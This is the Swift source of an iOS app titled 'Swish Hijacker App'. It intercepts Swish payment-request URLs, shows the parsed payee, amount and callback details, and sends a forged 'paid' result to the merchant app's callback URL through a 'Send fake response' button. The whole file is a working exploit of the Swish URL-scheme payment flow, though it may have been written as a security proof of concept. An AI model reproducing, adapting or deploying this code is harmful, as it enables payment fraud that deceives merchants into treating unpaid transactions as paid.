//
//  ViewController.swift
//  Hijacker2
//
//  Created by albin holmberg on 2022-04-07.
//

import UIKit
class RadioButton: UIButton {
    var alternateButton:Array<RadioButton>?
    override func awakeFromNib() {
        self.layer.cornerRadius = 5
        self.layer.borderWidth = 2.0
        self.layer.masksToBounds = true
    }
    
    
    func unselectAlternateButtons() {
        if alternateButton != nil {
            self.isSelected = true
            
            for aButton:RadioButton in alternateButton! {
                aButton.isSelected = false
            }
        } else {
            toggleButton()
        }
    }
    
    override func touchesBegan(_ touches: Set<UITouch>, with event: UIEvent?) {
        unselectAlternateButtons()
        super.touchesBegan(touches, with: event)
    }
    
    func toggleButton() {
        self.isSelected = !isSelected
    }
    
    override var isSelected: Bool {
        didSet {
            if isSelected {
                //self.layer.borderColor = UIColor.systemBlue.cgColor
                self.backgroundColor = .black
            } else {
                //self.layer.borderColor = UIColor.darkGray.cgColor
                self.backgroundColor = .white
            }
        }
    }
}
class ViewController: UIViewController {
    private let button:  UIButton={
        let button = UIButton()
        button.backgroundColor = .systemRed
        button.setTitle("Send fake response", for: .normal)
        button.setTitleColor(.black, for: .normal)
        button.layer.cornerRadius = 10
        
        return button
    }()
    private let paidButton = RadioButton()
    private let notPaidButton = RadioButton()
    
    public var phoneNrTxtField =  UITextField(frame: CGRect(x: 20, y: 200, width: 300, height: 50))
    public var amountTxtField = UITextField(frame: CGRect(x:20, y:275, width:300, height:50))
    public var messageTxtField = UITextField(frame:CGRect(x:20, y: 350,width: 300,height: 50))
    
    private var callbackUrl:String? = ""
    private var callbackParam:String? = ""
    
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        let width = self.view.frame.width
        let navigationBar: UINavigationBar = UINavigationBar(frame: CGRect(x: 0, y: 20, width: width, height: 40))
        navigationBar.backgroundColor = .opaqueSeparator
        self.view.addSubview(navigationBar)
        let navigationItem = UINavigationItem(title: "Swish Hijacker App")
        navigationBar.setItems([navigationItem], animated: false)
        view.backgroundColor = .systemGray6
        view.addSubview(button)
        button.frame = CGRect(x: view.frame.width/2-100, y:view.frame.height-100, width: 200, height: 50)
        button.addTarget(self, action: #selector(sendResponse), for: .touchUpInside)
        
        var paymentInfoLabel = UILabel.init(frame:CGRect(x: 20, y:150, width: 200, height: 50))
        paymentInfoLabel.text = "Hijacked Payment Info"
        paymentInfoLabel.textAlignment = .center
        paymentInfoLabel.font = paymentInfoLabel.font.withSize(20)


        //paymentInfoLabel.backgroundColor = .darkGray
        view.addSubview(paymentInfoLabel)
        
        addTextFields()
        addRadioButtons()
    }
    @objc func sendResponse(){
        if phoneNrTxtField.text == "" || phoneNrTxtField.text == nil{
            return
        }
        var result = "paid"
        if notPaidButton.isSelected{
            result = "notpaid"
        }
        var fakeSwishResponse: String = callbackUrl!;
        fakeSwishResponse += "?";
        fakeSwishResponse += callbackParam!;
        fakeSwishResponse += "=%7B%22result%22:%22"
        fakeSwishResponse += result
        fakeSwishResponse += "%22,%22amount%22:";
        fakeSwishResponse += amountTxtField.text!;
        fakeSwishResponse += ",%22message%22:%22"
        fakeSwishResponse += messageTxtField.text!.addingPercentEncoding(withAllowedCharacters: CharacterSet.urlQueryAllowed)!
        fakeSwishResponse += "%22,%22payee%22:%22"
        fakeSwishResponse += phoneNrTxtField.text!
        fakeSwishResponse += "%22,%22version%22:2%7D"
        
        print(fakeSwishResponse)
        let appUrl = URL(string: fakeSwishResponse)
        
        if UIApplication.shared.canOpenURL(appUrl! as URL) {
            UIApplication.shared.open(appUrl!)
        } else {
            print("App not installed")
        }
        phoneNrTxtField.text = ""
        amountTxtField.text = ""
        messageTxtField.text = ""
        paidButton.isSelected = true
        notPaidButton.isSelected = false
    }
    
    func addTextFields(){
        
        phoneNrTxtField.borderStyle = UITextField.BorderStyle.line
        phoneNrTxtField.attributedPlaceholder = NSAttributedString(
            string: "Telephone Number",
            attributes: [NSAttributedString.Key.foregroundColor: UIColor.darkGray]
        )
        phoneNrTxtField.textColor = .black
        phoneNrTxtField.backgroundColor = .white
        phoneNrTxtField.keyboardType = UIKeyboardType.phonePad
        phoneNrTxtField.borderStyle = UITextField.BorderStyle.roundedRect
        phoneNrTxtField.returnKeyType = UIReturnKeyType.done
        phoneNrTxtField.isUserInteractionEnabled = false
        view.addSubview(phoneNrTxtField)
        
        
        amountTxtField.borderStyle = UITextField.BorderStyle.line
        amountTxtField.attributedPlaceholder = NSAttributedString(
            string: "Amount to pay (SEK)",
            attributes: [NSAttributedString.Key.foregroundColor: UIColor.darkGray]
        )
        amountTxtField.textColor = .black
        amountTxtField.backgroundColor = .white
        amountTxtField.keyboardType = UIKeyboardType.numberPad
        amountTxtField.borderStyle = UITextField.BorderStyle.roundedRect
        amountTxtField.returnKeyType = UIReturnKeyType.done
        amountTxtField.isUserInteractionEnabled = false
        view.addSubview(amountTxtField)
        

        messageTxtField.borderStyle = UITextField.BorderStyle.line
        messageTxtField.attributedPlaceholder = NSAttributedString(
            string: "Message",
            attributes: [NSAttributedString.Key.foregroundColor: UIColor.darkGray]
        )
        messageTxtField.textColor = .black
        messageTxtField.backgroundColor = .white
        messageTxtField.keyboardType = UIKeyboardType.asciiCapable
        messageTxtField.borderStyle = UITextField.BorderStyle.roundedRect
        messageTxtField.returnKeyType = UIReturnKeyType.done
        messageTxtField.isUserInteractionEnabled = false
        view.addSubview(messageTxtField)
    }
    
    func addRadioButtons(){
        
        let paidLabel = UILabel(frame: CGRect(x:80,y:view.frame.height-235,width:40,height:40))
        paidLabel.text = "Paid"
        view.addSubview(paidLabel)
        
        paidButton.frame = CGRect(x: 80, y:view.frame.height-200, width: 30, height: 30)
        paidButton.isSelected = true
        paidButton.layer.borderColor = UIColor.white.cgColor
        paidButton.layer.cornerRadius = 15
        paidButton.layer.borderWidth = 10
        paidButton.layer.masksToBounds = true
        view.addSubview(paidButton)
        
        let notPaidLabel = UILabel(frame: CGRect(x:225,y:view.frame.height-235,width:100,height:40))
        notPaidLabel.text = "Not Paid"
        view.addSubview(notPaidLabel)
        
        notPaidButton.frame = CGRect(x: 240, y:view.frame.height-200, width: 30, height: 30)
        notPaidButton.isSelected = false
        notPaidButton.layer.borderColor = UIColor.white.cgColor
        notPaidButton.layer.cornerRadius = 15
        notPaidButton.layer.borderWidth = 10
        notPaidButton.layer.masksToBounds = true
        view.addSubview(notPaidButton)
        
        paidButton.alternateButton = [notPaidButton]
        notPaidButton.alternateButton = [paidButton]
        
    }
    
    func handlePaymentRequest(url: URL){
        let components = URLComponents(
                        url: url,
                        resolvingAgainstBaseURL: false
                    )!
        
        let paymentInfoJson: String? = components.queryItems?.first(where: {$0.name == "data"})?.value
        print(paymentInfoJson)
        let data = Data(paymentInfoJson.unsafelyUnwrapped.utf8)
        let decoder = JSONDecoder()
        let paymentInfo = try? decoder.decode(PaymentInfo.self, from: data);
        if paymentInfo != nil{
            phoneNrTxtField.text = paymentInfo?.payee.value
            amountTxtField.text = String(paymentInfo!.amount.value)
            messageTxtField.text = paymentInfo?.message.value
        }
        
        callbackUrl = components.queryItems?.first(where: {$0.name == "callbackurl"})?.value
        callbackParam = components.queryItems?.first(where: {$0.name == "callbackresultparameter"})?.value
    }


}

